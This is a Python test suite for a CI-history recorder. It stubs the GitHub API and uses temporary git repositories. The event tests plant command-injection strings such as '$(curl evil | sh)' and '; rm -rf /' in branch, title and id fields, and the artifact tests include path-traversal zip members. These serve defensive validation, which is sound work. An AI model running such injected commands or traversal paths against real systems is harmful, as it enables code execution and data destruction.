"""Host tests for scripts/ci_history.py (ROADMAP §10.9, CI history).

No network and no real `gh`: `Api` is a stub, and remotes are bare
repositories in a temporary directory. Git runs with an empty global
configuration, no system configuration, and `HOME` in the temp dir.
"""

from __future__ import annotations

import io
import json
import os
import subprocess
import tempfile
import textwrap
import unittest
import zipfile
from collections.abc import Mapping
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from unittest import mock

from scripts import ci_history
from scripts.ci_history import ApiError, HistoryError, HistoryRepo, NotRecorded

REPO = "owner/vibeOS"
SHA = "a" * 40
SHA2 = "b" * 40


class StubApi:
    """`json` answers from `routes` (path -> value, or an exception to raise);
    a list endpoint's value is its full item list, paged here as GitHub does."""

    def __init__(
        self,
        routes: Mapping[str, Any] | None = None,
        blobs: Mapping[str, bytes] | None = None,
    ) -> None:
        self.routes: dict[str, Any] = dict(routes or {})
        self.blobs: dict[str, bytes] = dict(blobs or {})
        self.calls: list[tuple[str, dict[str, str | int]]] = []

    def json(self, path: str, params: Mapping[str, str | int] | None = None) -> Any:
        p = dict(params or {})
        self.calls.append((path, p))
        v = self.routes.get(path)
        if callable(v):
            v = v(p)
        if isinstance(v, Exception):
            raise v
        if v is None:
            raise ApiError(path, 404, "Not Found (HTTP 404)")
        if "page" in p:
            page, per = int(p["page"]), int(p["per_page"])
            if isinstance(v, list):
                return v[(page - 1) * per: page * per]
            if isinstance(v, dict):
                for key, items in v.items():
                    if isinstance(items, list):
                        return {**v, key: items[(page - 1) * per: page * per]}
        return v

    def raw(self, path: str, max_bytes: int) -> bytes:
        self.calls.append((path, {}))
        if path not in self.blobs:
            raise ApiError(path, 404, "Not Found (HTTP 404)")
        data = self.blobs[path]
        if len(data) > max_bytes:
            raise ApiError(path, None, "too large")
        return data


def zip_bytes(members: Mapping[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


def results_file(tier: str = "test-kernel") -> bytes:
    return json.dumps({
        "schema": 1, "commit": SHA, "dirty": False, "arch": "x86_64", "tier": tier,
        "qemu": [], "ktest": {"passed": ["a"], "skipped": [], "failed": []},
        "utest": {"passed": [], "skipped": [], "failed": []},
        "marker": {"passed": [], "failed": []}, "retries": [], "irqoff": [1],
    }).encode()


def runner_file(cpu: str = "AMD EPYC 7763") -> bytes:
    return json.dumps(
        {"schema": 1, "os": "Linux", "arch": "X64", "cpu_model": cpu, "invtsc": True}
    ).encode()


def run_obj(
    run_id: int = 101,
    *,
    workflow: str = "ci",
    event: str = "push",
    branch: str = "main",
    sha: str = SHA,
    head_repo: str = REPO,
    created: str = "2026-03-02T10:00:00Z",
    status: str = "completed",
) -> dict[str, Any]:
    return {
        "id": run_id,
        "name": workflow,
        "path": ci_history.WORKFLOWS[workflow].path,
        "run_attempt": 2,
        "event": event,
        "status": status,
        "head_sha": sha,
        "head_branch": branch,
        "conclusion": "success",
        "created_at": created,
        "run_started_at": created,
        "head_repository": {"full_name": head_repo},
        "actor": {"login": "someone"},
        "triggering_actor": {"login": "someone"},
        "head_commit": {"author": {"name": "A Person", "email": "a@example.com"}},
    }


def plus(ts: str, secs: int) -> str:
    t = datetime.fromisoformat(ts.replace("Z", "+00:00")) + timedelta(seconds=secs)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def job_obj(name: str, created: str, started: str, completed: str) -> dict[str, Any]:
    return {
        "name": name,
        "conclusion": "success",
        "created_at": created,
        "started_at": started,
        "completed_at": completed,
        "steps": [
            {"name": "setup", "conclusion": "success",
             "started_at": started, "completed_at": plus(started, 7)},
            {"name": "skipped one", "conclusion": "skipped",
             "started_at": None, "completed_at": None},
            {"name": "make", "conclusion": "success",
             "started_at": plus(started, 7), "completed_at": completed},
        ],
    }


def run_routes(
    run: dict[str, Any],
    jobs: list[dict[str, Any]] | None = None,
    artifacts: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    base = f"/repos/{REPO}/actions/runs/{run['id']}"
    return {
        base: run,
        f"{base}/jobs": {"total_count": len(jobs or []), "jobs": jobs or []},
        f"{base}/artifacts": {"artifacts": artifacts or []},
        f"/repos/{REPO}": {"default_branch": "main"},
    }


def two_jobs() -> list[dict[str, Any]]:
    return [
        job_obj("check", "2026-03-02T10:00:05Z", "2026-03-02T10:00:10Z", "2026-03-02T10:02:00Z"),
        job_obj("tier (x86_64, e2e-1)", "2026-03-02T10:00:06Z", "2026-03-02T10:02:30Z",
                "2026-03-02T10:04:00Z"),
    ]


class GitIsolated(unittest.TestCase):
    """A temp dir, with git isolated from the host's configuration."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        gitconfig = self.tmp / "gitconfig"
        gitconfig.write_text("", encoding="utf-8")
        env = {
            "GIT_CONFIG_GLOBAL": str(gitconfig),
            "GIT_CONFIG_NOSYSTEM": "1",
            "HOME": str(self.tmp),
            "GIT_AUTHOR_NAME": "t",
            "GIT_AUTHOR_EMAIL": "t@example.invalid",
            "GIT_COMMITTER_NAME": "t",
            "GIT_COMMITTER_EMAIL": "t@example.invalid",
        }
        patcher = mock.patch.dict(os.environ, env)
        patcher.start()
        for k in ("GITHUB_ACTIONS", "GITHUB_STEP_SUMMARY", "GH_TOKEN"):
            os.environ.pop(k, None)
        self.addCleanup(patcher.stop)
        self.addCleanup(self._tmp.cleanup)
        self.remote = self.tmp / "remote.git"
        self.gitrun("init", "-q", "--bare", str(self.remote), cwd=self.tmp)
        self.sleeps: list[float] = []

    def gitrun(self, *args: str, cwd: Path) -> str:
        r = subprocess.run(
            ["git", "-c", "commit.gpgsign=false", *args],
            cwd=cwd, capture_output=True, text=True, check=True,
        )
        return r.stdout.strip()

    def history(self, name: str = "work", depth: int | None = 1) -> HistoryRepo:
        h = HistoryRepo(self.tmp / name, str(self.remote), sleep=self.sleeps.append)
        h.open(depth=depth)
        return h

    def remote_files(self, ref: str = "ci-history") -> set[str]:
        out = self.gitrun("ls-tree", "-r", "--name-only", ref, cwd=self.remote)
        return set(out.split())

    def remote_show(self, path: str, ref: str = "ci-history") -> Any:
        return json.loads(self.gitrun("show", f"{ref}:{path}", cwd=self.remote))


class TestRecord(unittest.TestCase):
    def test_record_from_stubbed_api(self) -> None:
        run = run_obj()
        api = StubApi(run_routes(run, two_jobs()))
        rec = ci_history.build_record(api, REPO, "ci", 101)
        for k in ("schema", "run_id", "workflow", "event", "head_sha", "branch", "conclusion",
                  "started", "finished", "runner", "jobs", "attempt"):
            self.assertIn(k, rec)
        self.assertEqual(rec["schema"], 1)
        self.assertEqual(rec["run_id"], 101)
        self.assertEqual(rec["head_sha"], SHA)
        self.assertEqual(rec["branch"], "main")
        self.assertEqual(rec["attempt"], 2)
        self.assertEqual(rec["started"], "2026-03-02T10:00:00Z")
        self.assertEqual(rec["finished"], "2026-03-02T10:04:00Z")
        self.assertIsNone(rec["runner"])
        check, tier = rec["jobs"]
        self.assertEqual(check["name"], "check")
        self.assertEqual(check["created"], "2026-03-02T10:00:05Z")
        self.assertEqual(check["seconds"], 110)
        self.assertEqual(tier["seconds"], 90)
        self.assertEqual(
            check["steps"],
            [{"name": "setup", "seconds": 7}, {"name": "skipped one", "seconds": None},
             {"name": "make", "seconds": 103}],
        )
        text = json.dumps(rec).lower()
        for banned in ("actor", "author", "email", "e-mail", "head_commit", "someone"):
            self.assertNotIn(banned, text)
        # jobs are read with filter=latest, paginated
        jobs_calls = [p for path, p in api.calls if path.endswith("/jobs")]
        self.assertEqual(jobs_calls[0]["filter"], "latest")
        self.assertIn("page", jobs_calls[0])

    def test_jobs_paginated(self) -> None:
        jobs = [job_obj(f"j{i}", "2026-03-02T10:00:00Z", "2026-03-02T10:00:00Z",
                        "2026-03-02T10:01:00Z") for i in range(150)]
        api = StubApi(run_routes(run_obj(), jobs))
        rec = ci_history.build_record(api, REPO, "ci", 101)
        self.assertEqual(len(rec["jobs"]), 150)

    def test_commit_input_honoured_only_for_listed_workflow(self) -> None:
        blob = zip_bytes({"commit.json": json.dumps({"schema": 1, "commit": SHA2}).encode()})
        art = [{"id": 9, "name": "commit-input", "size_in_bytes": len(blob), "expired": False}]
        blobs = {f"/repos/{REPO}/actions/artifacts/9/zip": blob}
        # release lists commit_input: the commit is recorded
        rel = run_obj(201, workflow="release", event="workflow_dispatch")
        rec = ci_history.build_record(
            StubApi(run_routes(rel, two_jobs(), art), blobs), REPO, "release", 201
        )
        self.assertEqual(rec["commit"], SHA2)
        # ci does not: the artifact is ignored
        rec = ci_history.build_record(
            StubApi(run_routes(run_obj(), two_jobs(), art), blobs), REPO, "ci", 101
        )
        self.assertNotIn("commit", rec)
        # a pull request, another head repository, or another branch: ignored
        for kw in ({"event": "pull_request"}, {"head_repo": "fork/vibeOS"},
                   {"branch": "topic"}):
            run = run_obj(202, workflow="release", **kw)
            warnings: list[str] = []
            rec = ci_history.build_record(
                StubApi(run_routes(run, two_jobs(), art), blobs), REPO, "release", 202, warnings
            )
            self.assertNotIn("commit", rec, kw)
            self.assertTrue(warnings, kw)

    def test_rejects_run_of_another_path(self) -> None:
        run = {**run_obj(), "path": ".github/workflows/evil.yml"}
        with self.assertRaises(HistoryError):
            ci_history.build_record(StubApi(run_routes(run, two_jobs())), REPO, "ci", 101)

    def test_tombstone_fields(self) -> None:
        t = ci_history.tombstone(run_obj(), "ci", "jobs API returned 410")
        self.assertEqual(t["jobs"], [])
        self.assertEqual(t["tombstone"], "jobs API returned 410")
        self.assertTrue(ci_history.valid_record(t, "ci", 101))
        self.assertNotIn("actor", json.dumps(t))


class TestEvent(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.path = Path(self._tmp.name) / "event.json"

    def event(self, **run: Any) -> Path:
        wr: dict[str, Any] = {
            "id": 555,
            "name": "ci",
            "path": ".github/workflows/ci.yml",
            "head_branch": "$(curl evil | sh)",
            "display_title": "`; rm -rf / #",
            "head_sha": "not-a-sha",
            "head_commit": {"message": "$(id)"},
        }
        wr.update(run)
        self.path.write_text(
            json.dumps({"workflow_run": wr, "repository": {"full_name": REPO}}),
            encoding="utf-8",
        )
        return self.path

    def test_event_reads_only_run_id(self) -> None:
        self.assertEqual(ci_history.load_event(self.event(), REPO), ("ci", 555))
        self.assertEqual(
            ci_history.load_event(
                self.event(name="release", path=".github/workflows/release.yml"), REPO
            ),
            ("release", 555),
        )

    def test_event_rejects_unlisted_workflow(self) -> None:
        with self.assertRaises(NotRecorded):
            ci_history.load_event(
                self.event(name="nightly", path=".github/workflows/nightly.yml"), REPO
            )
        with self.assertRaises(NotRecorded):
            ci_history.load_event(self.event(), "someone/else")

    def test_event_rejects_other_path(self) -> None:
        # a fork's second workflow that calls itself `ci`
        with self.assertRaises(NotRecorded):
            ci_history.load_event(self.event(path=".github/workflows/ci2.yml"), REPO)

    def test_event_rejects_non_integer_id(self) -> None:
        for bad in ("555", 5.5, None, True, -1, 0, "555; rm -rf /"):
            with self.assertRaises(HistoryError, msg=repr(bad)):
                ci_history.load_event(self.event(id=bad), REPO)

    def test_main_notice_for_unlisted_run(self) -> None:
        path = self.event(name="other", path=".github/workflows/other.yml")
        with mock.patch.dict(os.environ, {"GITHUB_REPOSITORY": REPO}), \
                mock.patch.object(ci_history, "GhApi") as gh:
            self.assertEqual(ci_history.main(["--event", str(path)]), 0)
            gh.assert_not_called()


class TestArtifacts(unittest.TestCase):
    def build(self, arts: list[dict[str, Any]], blobs: dict[str, bytes],
              jobs: list[dict[str, Any]] | None = None) -> tuple[dict[str, Any], list[str]]:
        warnings: list[str] = []
        routes = run_routes(run_obj(), two_jobs() if jobs is None else jobs, arts)
        self.api = StubApi(routes, blobs)
        rec = ci_history.build_record(self.api, REPO, "ci", 101, warnings)
        return rec, warnings

    @staticmethod
    def art(aid: int, name: str, blob: bytes, size: int | None = None) -> dict[str, Any]:
        return {"id": aid, "name": name, "expired": False,
                "size_in_bytes": len(blob) if size is None else size}

    @staticmethod
    def url(aid: int) -> str:
        return f"/repos/{REPO}/actions/artifacts/{aid}/zip"

    def test_slug(self) -> None:
        self.assertEqual(ci_history.slug("tier (x86_64, e2e-1)"), "tier-x86-64-e2e-1")
        self.assertEqual(ci_history.slug("Check"), "check")
        self.assertEqual(ci_history.slug("a -- b"), "a-b")

    def test_results_attached_by_slug(self) -> None:
        blob = zip_bytes({"x86_64-test-e2e.json": results_file("test-e2e")})
        chk = zip_bytes({"x86_64-adhoc.json": results_file("adhoc")})
        other = zip_bytes({"a.json": results_file()})
        rec, warnings = self.build(
            [self.art(1, "results-x86_64-e2e-1", blob), self.art(2, "results-check", chk),
             self.art(3, "prebuilt-x86_64", other), self.art(4, "results-nomatch", other)],
            {self.url(1): blob, self.url(2): chk, self.url(3): other, self.url(4): other},
        )
        check, tier = rec["jobs"]
        self.assertEqual([r["tier"] for r in tier["results"]], ["test-e2e"])
        self.assertEqual([r["tier"] for r in check["results"]], ["adhoc"])
        self.assertEqual(tier["results"][0]["irqoff"], [1])  # unknown keys kept
        self.assertNotIn("_path", tier["results"][0])
        self.assertTrue(any("results-nomatch" in w for w in warnings))
        # prebuilt-* is never downloaded
        self.assertNotIn(self.url(3), [path for path, _ in self.api.calls])
        # one job only: an unmatched artifact goes to it
        rec, _ = self.build([self.art(4, "results-nomatch", other)], {self.url(4): other},
                            jobs=two_jobs()[:1])
        self.assertEqual(len(rec["jobs"][0]["results"]), 1)

    def test_runner_parsed_per_job(self) -> None:
        good = zip_bytes({"runner.json": runner_file()})
        bad = zip_bytes({"runner.json": json.dumps(
            {"schema": 1, "os": "L", "arch": "X", "cpu_model": "x" * 201, "invtsc": True}
        ).encode()})
        rec, warnings = self.build(
            [self.art(1, "runner-x86_64-e2e-1", good), self.art(2, "runner-check", bad)],
            {self.url(1): good, self.url(2): bad},
        )
        check, tier = rec["jobs"]
        self.assertEqual(tier["runner"]["cpu_model"], "AMD EPYC 7763")
        self.assertIsNone(check["runner"])
        self.assertEqual(rec["runner"], tier["runner"])  # exactly one job has one
        self.assertTrue(warnings)
        both = zip_bytes({"runner.json": runner_file("Intel Xeon")})
        rec, _ = self.build(
            [self.art(1, "runner-x86_64-e2e-1", good), self.art(2, "runner-check", both)],
            {self.url(1): good, self.url(2): both},
        )
        self.assertIsNone(rec["runner"])  # two jobs have one
        self.assertEqual(rec["jobs"][0]["runner"]["cpu_model"], "Intel Xeon")
        self.assertIsNone(ci_history.parse_runner({"schema": 2}))
        self.assertIsNone(ci_history.parse_runner(
            {"schema": 1, "os": "L", "arch": "X", "cpu_model": "c", "invtsc": "yes"}))

    def test_untrusted_artifact_limits(self) -> None:
        blob = zip_bytes({"r.json": results_file()})
        huge_member = zip_bytes({"r.json": b" " * (ci_history.MAX_MEMBER_BYTES + 1)})
        traversal = zip_bytes({"../../escape.json": results_file(),
                               "/abs/escape.json": results_file()})
        bad_json = zip_bytes({"r.json": b"{not json"})
        not_zip = b"PK\x03\x04garbage"
        cwd = Path.cwd()
        with tempfile.TemporaryDirectory() as tmp:
            os.chdir(tmp)
            try:
                rec, warnings = self.build(
                    [
                        self.art(1, "results-x86_64-e2e-1", blob,
                                 size=ci_history.MAX_ARTIFACT_BYTES + 1),
                        self.art(2, "results-check", huge_member),
                        self.art(3, "results-x86_64-e2e-1", traversal),
                        self.art(4, "results-check", bad_json),
                        self.art(5, "results-check", not_zip),
                    ],
                    {self.url(1): blob, self.url(2): huge_member, self.url(3): traversal,
                     self.url(4): bad_json, self.url(5): not_zip},
                )
                self.assertEqual(os.listdir(tmp), [])
            finally:
                os.chdir(cwd)
        self.assertFalse(Path(tempfile.gettempdir(), "escape.json").exists())
        check, tier = rec["jobs"]
        # the oversize artifact was never downloaded; the traversal members
        # were read in memory under fresh names
        self.assertEqual(len(tier["results"]), 2)
        self.assertEqual(check["results"], [])
        self.assertGreaterEqual(len(warnings), 4)
        # a download larger than it was listed is refused by the capped reader
        big = b"x" * 64
        rec, warnings = self.build(
            [self.art(6, "results-check", big, size=10)], {self.url(6): big}
        )
        self.assertEqual(rec["jobs"][0]["results"], [])


class TestWriter(GitIsolated):
    def test_bootstrap_creates_orphan_branch(self) -> None:
        h = self.history()
        sha = h.commit_files({"runs/ci/1.json": b"{}\n"}, "ci run 1")
        self.assertIsNotNone(sha)
        self.assertEqual(self.remote_files(), {"runs/ci/1.json"})
        parents = self.gitrun("rev-list", "--parents", "-n1", "ci-history", cwd=self.remote)
        self.assertEqual(len(parents.split()), 1)  # a root commit
        branches = self.gitrun("for-each-ref", "--format=%(refname)", cwd=self.remote)
        self.assertEqual(branches.split(), ["refs/heads/ci-history"])
        author = self.gitrun("log", "-1", "--format=%an <%ae>", "ci-history", cwd=self.remote)
        self.assertEqual(author, f"{ci_history.BOT_NAME} <{ci_history.BOT_EMAIL}>")

    def test_one_file_per_run_id(self) -> None:
        h = self.history()
        first = {**ci_history.tombstone(run_obj(7), "ci", "x"), "attempt": 1}
        h.commit_files({ci_history.record_path("ci", 7): ci_history.encode(first)}, "ci run 7")
        h2 = self.history("work2")
        second = {**first, "attempt": 2}
        h2.commit_files({ci_history.record_path("ci", 7): ci_history.encode(second)}, "ci run 7")
        self.assertEqual(self.remote_files(), {"runs/ci/7.json"})
        self.assertEqual(self.remote_show("runs/ci/7.json")["attempt"], 2)
        # the same bytes again: nothing to commit
        self.assertIsNone(h2.commit_files(
            {ci_history.record_path("ci", 7): ci_history.encode(second)}, "ci run 7"))
        self.assertTrue(h2.has("ci", 7))
        self.assertFalse(h2.has("ci", 8))
        with self.assertRaises(HistoryError):
            ci_history.record_path("../x", 1)
        with self.assertRaises(HistoryError):
            h2.commit_files({"../x.json": b"{}"}, "bad")

    def test_concurrent_writers_lose_no_record(self) -> None:
        self.history("seed").commit_files({"runs/ci/1.json": b"{}\n"}, "ci run 1")
        a = self.history("a")
        b = self.history("b")  # both read the same tip
        a.commit_files({"runs/ci/2.json": b"{}\n"}, "ci run 2")
        b.commit_files({"runs/ci/3.json": b"{}\n"}, "ci run 3")  # rejected, re-applied
        self.assertEqual(self.remote_files(),
                         {"runs/ci/1.json", "runs/ci/2.json", "runs/ci/3.json"})
        self.assertEqual(len(self.sleeps), 1)
        self.assertTrue(1.0 <= self.sleeps[0] <= 5.0)
        log = self.gitrun("log", "--format=%s", "ci-history", cwd=self.remote).split("\n")
        self.assertEqual(log, ["ci run 3", "ci run 2", "ci run 1"])

    def test_concurrent_bootstrap(self) -> None:
        a = self.history("a")
        b = self.history("b")  # neither sees a branch
        a.commit_files({"runs/ci/1.json": b"{}\n"}, "ci run 1")
        b.commit_files({"runs/ci/2.json": b"{}\n"}, "ci run 2")
        self.assertEqual(self.remote_files(), {"runs/ci/1.json", "runs/ci/2.json"})

    def test_open_fails_without_remote(self) -> None:
        h = HistoryRepo(self.tmp / "w", str(self.tmp / "missing.git"), sleep=self.sleeps.append)
        with self.assertRaises(HistoryError):
            h.open()

    def test_retry_after_restart(self) -> None:
        seed = self.history("seed")
        seed.commit_files({"runs/ci/1.json": b"{}\n", "runs/ci/2.json": b"{}\n"}, "old")
        w = self.history("w")  # reads the pre-rotation tip
        # a rotation restarts the branch from an orphan commit without run 1
        r = self.tmp / "rot"
        self.gitrun("clone", "-q", "--branch", "ci-history", str(self.remote), str(r),
                    cwd=self.tmp)
        self.gitrun("checkout", "-q", "--orphan", "fresh", cwd=r)
        self.gitrun("rm", "-q", "--cached", "runs/ci/1.json", cwd=r)
        (r / "runs/ci/1.json").unlink()
        (r / "archives.json").write_text('{"schema": 1, "archives": []}\n')
        self.gitrun("add", "archives.json", cwd=r)
        self.gitrun("commit", "-q", "-m", "rotate", cwd=r)
        root = self.gitrun("rev-parse", "HEAD", cwd=r)
        self.gitrun("push", "-q", "-f", "origin", "HEAD:refs/heads/ci-history", cwd=r)
        w.commit_files({"runs/ci/3.json": b"{}\n"}, "ci run 3")
        self.assertEqual(self.remote_files(),
                         {"runs/ci/2.json", "runs/ci/3.json", "archives.json"})
        parents = self.gitrun("rev-list", "--parents", "-n1", "ci-history",
                              cwd=self.remote).split()
        self.assertEqual(parents[1:], [root])


NOW = datetime(2026, 4, 15, tzinfo=UTC)
LANDED = "2026-03-01T12:00:00Z"
LANDING_SHA = "c" * 40


class ApiWorld:
    """The runs, commits and jobs the stub API serves for the completeness
    check and the backfill."""

    def __init__(self) -> None:
        self.runs: list[dict[str, Any]] = []
        self.jobs: dict[int, Any] = {}
        self.descendants: set[str] = set()
        self.landed = True

    def add(self, run: dict[str, Any], jobs: Any = None) -> dict[str, Any]:
        self.runs.append(run)
        self.jobs[run["id"]] = two_jobs() if jobs is None else jobs
        return run

    def list_runs(self, p: Mapping[str, str | int]) -> dict[str, Any]:
        lo, hi = str(p["created"]).split("..")
        assert p["branch"] == "main"
        out = [r for r in self.runs if lo <= r["created_at"][:10] <= hi]
        out.sort(key=lambda r: r["created_at"], reverse=True)
        return {"total_count": len(out), "workflow_runs": out}

    def api(self) -> StubApi:
        routes: dict[str, Any] = {
            f"/repos/{REPO}": {"default_branch": "main"},
            f"/repos/{REPO}/actions/workflows/ci.yml": {"created_at": "2025-11-20T00:00:00Z"},
            f"/repos/{REPO}/actions/workflows/ci.yml/runs": self.list_runs,
            f"/repos/{REPO}/commits": [
                {"sha": "d" * 40, "commit": {"committer": {"date": "2026-03-20T00:00:00Z"}}},
                {"sha": LANDING_SHA, "commit": {"committer": {"date": LANDED}}},
            ] if self.landed else [],
        }
        for r in self.runs:
            base = f"/repos/{REPO}/actions/runs/{r['id']}"
            routes[base] = r
            j = self.jobs[r["id"]]
            routes[f"{base}/jobs"] = j if isinstance(j, Exception) else {"jobs": j}
            routes[f"{base}/artifacts"] = {"artifacts": []}
            status = "ahead" if r["head_sha"] in self.descendants else "diverged"
            routes[f"/repos/{REPO}/compare/{LANDING_SHA}...{r['head_sha']}"] = {"status": status}
        return StubApi(routes)


class TestComplete(GitIsolated):
    def setUp(self) -> None:
        super().setUp()
        self.world = ApiWorld()
        self.h = self.history()

    def check(self, gated: str | None = None, needed: set[str] | None = None) -> list[str]:
        return ci_history.check_complete(
            self.world.api(), REPO, self.h, gated, needed or set(), now=NOW
        )

    def put(self, rec: dict[str, Any]) -> None:
        self.h.commit_files(
            {ci_history.record_path(rec["workflow"], rec["run_id"]): ci_history.encode(rec)},
            "put",
        )

    def full(self, run: dict[str, Any]) -> dict[str, Any]:
        return {**ci_history.run_fields(run, "ci"), "jobs": [{"name": "check"}]}

    def test_missing_main_run_fails(self) -> None:
        a = self.world.add(run_obj(301, sha=SHA, created="2026-03-05T00:00:00Z"))
        self.world.add(run_obj(302, sha=SHA2, created="2026-04-02T00:00:00Z"))
        self.world.descendants |= {SHA, SHA2}
        self.put(self.full(a))
        problems = self.check()
        self.assertEqual(len(problems), 1)
        self.assertIn("run 302", problems[0])
        # the landing is unknown before the workflow lands: nothing to check
        self.world.landed = False
        self.assertEqual(self.check(), [])

    def test_pre_landing_runs_ignored(self) -> None:
        # created before the landing commit's date, or not a descendant of it
        self.world.add(run_obj(311, sha=SHA, created="2026-02-10T00:00:00Z"))
        self.world.add(run_obj(312, sha=SHA2, created="2026-03-10T00:00:00Z"))
        self.world.descendants |= {SHA}
        api = self.world.api()
        self.assertEqual(
            ci_history.check_complete(api, REPO, self.h, None, set(), now=NOW), []
        )
        compares = [p for p, _ in api.calls if "/compare/" in p]
        self.assertEqual(compares, [f"/repos/{REPO}/compare/{LANDING_SHA}...{SHA2}"])

    def test_pull_request_runs_ignored(self) -> None:
        self.world.descendants |= {SHA}
        self.world.add(run_obj(321, event="pull_request", created="2026-03-10T00:00:00Z"))
        # a fork's pull request from its own `main`
        self.world.add(run_obj(322, event="pull_request", head_repo="fork/vibeOS",
                               created="2026-03-10T00:00:00Z"))
        self.world.add(run_obj(323, head_repo="fork/vibeOS", created="2026-03-10T00:00:00Z"))
        self.world.add(run_obj(324, branch="topic", created="2026-03-10T00:00:00Z"))
        self.world.add(run_obj(325, status="in_progress", created="2026-03-10T00:00:00Z"))
        self.assertEqual(self.check(), [])
        self.world.add(run_obj(326, event="workflow_dispatch", created="2026-03-10T00:00:00Z"))
        self.assertEqual(len(self.check()), 1)

    def test_tombstone_accepted(self) -> None:
        run = self.world.add(run_obj(331, created="2026-03-10T00:00:00Z"))
        self.world.descendants |= {SHA}
        self.put(ci_history.tombstone(run, "ci", "the jobs API returned 410"))
        self.assertEqual(self.check(), [])
        # a gate names ci, but the tombstoned run is not the gated commit's
        self.assertEqual(self.check(gated=SHA2, needed={"ci"}), [])

    def test_tombstone_rejected_when_gate_needs_run(self) -> None:
        gates = self.tmp / "gates"
        gates.mkdir()
        (gates / "phase-10.toml").write_text(textwrap.dedent("""\
            [[line]]
            key = "exit gate"
            [[line.entry]]
            job = {workflow = "ci", job = "check"}
            [[line.entry]]
            cmd = "make check"
        """), encoding="utf-8")
        (gates / "phase-10-needs.toml").write_text("[[box]]\n", encoding="utf-8")
        needed = ci_history.gate_job_entries(gates)
        self.assertEqual(needed, {"ci"})
        run = self.world.add(run_obj(341, created="2026-03-10T00:00:00Z"))
        self.world.descendants |= {SHA}
        self.put(ci_history.tombstone(run, "ci", "the jobs API returned 404"))
        problems = self.check(gated=SHA, needed=needed)
        self.assertEqual(len(problems), 1)
        self.assertIn("tombstone", problems[0])
        # no gate names ci: accepted
        self.assertEqual(self.check(gated=SHA, needed=set()), [])
        # a full, successful record proves the same commit: accepted
        again = self.world.add(run_obj(342, created="2026-03-11T00:00:00Z"))
        self.put(self.full(again))
        self.assertEqual(self.check(gated=SHA, needed=needed), [])

    def test_gate_job_entries(self) -> None:
        gates = self.tmp / "g"
        self.assertEqual(ci_history.gate_job_entries(gates), set())
        gates.mkdir()
        (gates / "common.toml").write_text(
            '[[line]]\nkey = "k"\n[[line.entry]]\njob = {workflow = "release.yml", job = "b"}\n',
            encoding="utf-8",
        )
        (gates / "phase-11.toml").write_text(
            '[[line]]\nkey = "k"\n[[line.entry]]\njob = {workflow = "ci.yml", job = "b"}\n',
            encoding="utf-8",
        )
        self.assertEqual(ci_history.gate_job_entries(gates), {"ci", "release"})
        (gates / "phase-12.toml").write_text("not = [toml", encoding="utf-8")
        with self.assertRaises(HistoryError):
            ci_history.gate_job_entries(gates)

    def test_invalid_record_counts_as_missing(self) -> None:
        run = self.world.add(run_obj(351, created="2026-03-10T00:00:00Z"))
        self.world.descendants |= {SHA}
        bad = {**self.full(run), "schema": 2}
        self.h.commit_files({"runs/ci/351.json": ci_history.encode(bad)}, "bad")
        self.assertEqual(len(self.check()), 1)
        self.assertEqual(self.h.invalid, ["runs/ci/351.json"])
        self.h.commit_files({"runs/ci/351.json": b"{not json"}, "worse")
        self.assertEqual(len(self.check()), 1)
        # a record of another run under this run's name
        self.h.commit_files(
            {"runs/ci/351.json": ci_history.encode(self.full(run_obj(999)))}, "wrong id"
        )
        self.assertEqual(len(self.check()), 1)

    def test_month_windows(self) -> None:
        wins = list(ci_history._months(datetime(2025, 12, 20).date(),
                                       datetime(2026, 2, 3).date()))
        self.assertEqual([(a.isoformat(), b.isoformat()) for a, b in wins], [
            ("2026-02-01", "2026-02-03"), ("2026-01-01", "2026-01-31"),
            ("2025-12-20", "2025-12-31"),
        ])


class TestBackfill(GitIsolated):
    def setUp(self) -> None:
        super().setUp()
        self.world = ApiWorld()
        self.h = self.history()

    def backfill(self, limit: int = 200) -> tuple[int, int]:
        return ci_history.backfill(self.world.api(), REPO, self.h, limit, now=NOW)

    def test_backfill_writes_missing(self) -> None:
        self.world.add(run_obj(401, created="2025-12-01T00:00:00Z"))  # before the landing
        self.world.add(run_obj(402, created="2026-03-10T00:00:00Z"))
        self.world.add(run_obj(403, event="pull_request", created="2026-03-10T00:00:00Z"))
        held = self.world.add(run_obj(404, created="2026-04-01T00:00:00Z"))
        self.h.commit_files({"runs/ci/404.json": ci_history.encode(
            ci_history.tombstone(held, "ci", "kept"))}, "held")
        self.assertEqual(self.backfill(), (2, 0))
        self.assertEqual(self.remote_files(),
                         {"runs/ci/401.json", "runs/ci/402.json", "runs/ci/404.json"})
        self.assertEqual(self.remote_show("runs/ci/404.json")["tombstone"], "kept")
        self.assertEqual(len(self.remote_show("runs/ci/402.json")["jobs"]), 2)
        msg = self.gitrun("log", "-1", "--format=%s", "ci-history", cwd=self.remote)
        self.assertEqual(msg, "backfill ci: 2 records, 0 tombstones")
        self.assertEqual(self.backfill(), (0, 0))

    def test_backfill_tombstone_when_jobs_gone(self) -> None:
        self.world.add(run_obj(411, created="2026-03-10T00:00:00Z"),
                       ApiError("jobs", 404, "Not Found (HTTP 404)"))
        self.world.add(run_obj(412, created="2026-03-11T00:00:00Z"),
                       ApiError("jobs", 410, "Gone (HTTP 410)"))
        self.world.add(run_obj(413, created="2026-03-12T00:00:00Z"), [])
        self.assertEqual(self.backfill(), (0, 3))
        for rid, reason in ((411, "404"), (412, "410"), (413, "no jobs")):
            rec = self.remote_show(f"runs/ci/{rid}.json")
            self.assertEqual(rec["jobs"], [])
            self.assertIn(reason, rec["tombstone"])
            self.assertEqual(rec["head_sha"], SHA)
        # any other API failure is an error, not a tombstone
        self.world.add(run_obj(414, created="2026-03-13T00:00:00Z"),
                       ApiError("jobs", 502, "Bad Gateway (HTTP 502)"))
        with self.assertRaises(ApiError):
            self.backfill()

    def test_backfill_limit(self) -> None:
        for i in range(5):
            self.world.add(run_obj(430 + i, created=f"2026-03-1{i}T00:00:00Z"))
        self.assertEqual(self.backfill(limit=2), (2, 0))
        # newest first
        self.assertEqual(self.remote_files(), {"runs/ci/434.json", "runs/ci/433.json"})
        self.assertEqual(self.backfill(limit=2), (2, 0))
